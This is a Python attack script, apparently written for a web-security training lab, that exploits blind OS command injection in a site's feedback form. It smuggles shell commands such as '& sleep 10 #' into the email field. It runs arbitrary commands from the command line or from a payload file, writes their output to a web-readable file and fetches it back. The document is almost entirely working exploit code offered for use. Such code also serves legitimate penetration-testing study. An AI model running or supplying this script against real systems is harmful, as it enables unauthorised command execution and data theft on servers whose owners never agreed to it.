import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to retrieve CSRF token
def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

# Function to check for time-based command injection
def check_time_based_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.ca & sleep 10 #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if res.elapsed.total_seconds() >= 10:
        print("(+) Email field is vulnerable to time-based command injection!")
    else:
        print("(-) Email field is not vulnerable to time-based command injection")

# Function to exploit blind command injection
def exploit_blind_injection(s, url, command):
    submit_feedback_path = '/feedback/submit'
    command_injection = f'test@test.ca & {command} > /var/www/images/output2.txt #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    
    print("(+) Verifying if command injection exploit worked...")
    time.sleep(2)  # Wait for the command to execute

    # Verify the command execution result
    file_path = '/image?filename=output2.txt'
    res = s.get(url + file_path, verify=False, proxies=proxies)
    if res.status_code == 200:
        print("(+) Command injection successful!")
        print("(+) Output of the command: " + res.text)
    else:
        print("(-) Command injection failed.")

# Function to run command injection with payload file
def run_injection_with_payload(s, url, payload_file):
    with open(payload_file, 'r') as f:
        for line in f:
            command = line.strip()
            print(f"(+) Testing payload: {command}")
            exploit_blind_injection(s, url, command)

# Main function to handle different modes
def main():
    if len(sys.argv) < 3:
        print("(+) Usage: %s <url> <mode> [payload_file]" % sys.argv[0])
        print("(+) Modes: ")
        print("    - time_check: Check for time-based injection vulnerability")
        print("    - blind_exploit: Exploit blind command injection")
        print("    - payload_test: Run command injection using a payload file")
        print("(+) Example: %s www.example.com time_check" % sys.argv[0])
        print("(+) Example: %s www.example.com payload_test payloads.txt" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    mode = sys.argv[2]

    s = requests.Session()

    if mode == 'time_check':
        print("(+) Checking for time-based command injection vulnerability...")
        check_time_based_injection(s, url)
    elif mode == 'blind_exploit':
        if len(sys.argv) != 4:
            print("(-) Missing payload argument.")
            sys.exit(-1)
        payload = sys.argv[3]
        print(f"(+) Exploiting blind command injection with payload: {payload}")
        exploit_blind_injection(s, url, payload)
    elif mode == 'payload_test':
        if len(sys.argv) != 4:
            print("(-) Missing payload file.")
            sys.exit(-1)
        payload_file = sys.argv[3]
        print(f"(+) Running command injection tests with payloads from {payload_file}")
        run_injection_with_payload(s, url, payload_file)
    else:
        print("(-) Invalid mode. Use 'time_check', 'blind_exploit', or 'payload_test'.")
        sys.exit(-1)

if __name__ == "__main__":
    main()
